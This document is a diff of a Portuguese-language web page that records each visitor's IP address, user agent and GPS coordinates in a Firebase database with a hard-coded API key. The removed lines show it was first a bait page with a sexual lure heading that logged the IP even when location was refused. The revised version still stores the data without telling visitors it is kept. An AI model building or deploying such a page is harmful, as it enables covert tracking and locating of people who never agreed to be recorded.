@@ -117,8 +117,8 @@ button {
 <body>
 
 <div id="startScreen">
-  <h1>site dos fixes onde tem mamas grandes</h1>
-  <p>clique a qui se for fixe.</p>
+  <h1>Mostrar IP e localização</h1>
+  <p>Ao clicar, será pedido acesso à localização.</p>
   <button id="openBtn">Abrir</button>
 </div>
 
@@ -137,14 +137,14 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/fireba
 import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
 /* SUBSTITUI PELOS DADOS DO TEU FIREBASE */
-const firebaseConfig = {
-  apiKey: "METE_AQUI",
-  authDomain: "METE_AQUI",
-  projectId: "METE_AQUI",
-  storageBucket: "METE_AQUI",
-  messagingSenderId: "METE_AQUI",
-  appId: "METE_AQUI"
-};
+    const firebaseConfig = {
+      apiKey: "AIzaSyCrF-J4HWzpHcws_RdFSsHDrYQqgMJKgvE",
+      authDomain: "content-729f5.firebaseapp.com",
+      projectId: "content-729f5",
+      storageBucket: "content-729f5.firebasestorage.app",
+      messagingSenderId: "541149104135",
+      appId: "1:541149104135:web:25b1bd0d8e31f2bb64c2a2"
+    };
 
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
@@ -164,16 +164,21 @@ let cachedIP = "UNKNOWN";
 let effectStarted = false;
 let lastClickTime = null;
 
+/* Buscar IP logo ao carregar */
 async function preloadIP() {
   try {
     const res = await fetch("https://api.ipify.org?format=json");
     const data = await res.json();
     cachedIP = data.ip || "UNKNOWN";
-    if (effectStarted) text.textContent = cachedIP;
+    if (effectStarted) {
+      text.textContent = cachedIP;
+    }
     console.log("IP carregado:", cachedIP);
   } catch (error) {
     cachedIP = "ERROR";
-    if (effectStarted) text.textContent = cachedIP;
+    if (effectStarted) {
+      text.textContent = cachedIP;
+    }
     console.error("Erro ao obter IP:", error);
   }
 }
@@ -221,47 +226,28 @@ async function saveToFirestore(payload) {
 
     console.log("Guardado com sucesso. ID:", docRef.id);
 
-    if (payload.latitude !== null && payload.longitude !== null) {
-      locationText.textContent =
-        `Guardado às ${payload.clickedAtLocal} | IP ${payload.ip} | com localização`;
-    } else {
-      locationText.textContent =
-        `Guardado às ${payload.clickedAtLocal} | IP ${payload.ip} | sem localização`;
-    }
+    locationText.textContent =
+      `Guardado às ${payload.clickedAtLocal} | IP ${payload.ip}`;
   } catch (error) {
     console.error("Erro ao guardar no Firestore:", error);
     locationText.textContent = "Erro ao guardar no Firebase: " + error.message;
   }
 }
 
-async function saveIPOnly(reason = "location_unavailable") {
-  const clickDate = lastClickTime || new Date();
-
-  const payload = {
-    ip: cachedIP,
-    latitude: null,
-    longitude: null,
-    accuracy: null,
-    locationStatus: reason,
-    userAgent: navigator.userAgent,
-    clickedAtISO: clickDate.toISOString(),
-    clickedAtLocal: clickDate.toLocaleString("pt-PT")
-  };
-
-  await saveToFirestore(payload);
-}
-
 function requestLocationAndSave() {
   if (!navigator.geolocation) {
-    locationText.textContent = "Geolocalização não suportada. A guardar só IP...";
-    saveIPOnly("geolocation_not_supported");
+    locationText.textContent = "Geolocalização não suportada neste browser.";
+    console.log("Geolocalização não suportada.");
     return;
   }
 
   locationText.textContent = "A pedir permissão de localização...";
+  console.log("A pedir localização...");
 
   navigator.geolocation.getCurrentPosition(
     async (position) => {
+      console.log("Localização recebida:", position);
+
       const clickDate = lastClickTime || new Date();
 
       const payload = {
@@ -269,37 +255,32 @@ function requestLocationAndSave() {
         latitude: position.coords.latitude,
         longitude: position.coords.longitude,
         accuracy: position.coords.accuracy,
-        locationStatus: "granted",
         userAgent: navigator.userAgent,
         clickedAtISO: clickDate.toISOString(),
         clickedAtLocal: clickDate.toLocaleString("pt-PT")
       };
 
+      console.log("Payload:", payload);
       await saveToFirestore(payload);
+
       text.textContent = cachedIP;
     },
-    async (error) => {
+    (error) => {
       console.error("Erro ao obter localização:", error);
 
       switch (error.code) {
         case error.PERMISSION_DENIED:
-          locationText.textContent = "Localização recusada. A guardar só IP...";
-          await saveIPOnly("permission_denied");
+          locationText.textContent = "Permissão de localização negada.";
           break;
         case error.POSITION_UNAVAILABLE:
-          locationText.textContent = "Localização indisponível. A guardar só IP...";
-          await saveIPOnly("position_unavailable");
+          locationText.textContent = "Localização indisponível.";
           break;
         case error.TIMEOUT:
-          locationText.textContent = "Timeout da localização. A guardar só IP...";
-          await saveIPOnly("timeout");
+          locationText.textContent = "Tempo de espera excedido.";
           break;
         default:
-          locationText.textContent = "Erro na localização. A guardar só IP...";
-          await saveIPOnly("unknown_error");
+          locationText.textContent = "Erro ao obter localização.";
       }
-
-      text.textContent = cachedIP;
     },
     {
       enableHighAccuracy: true,
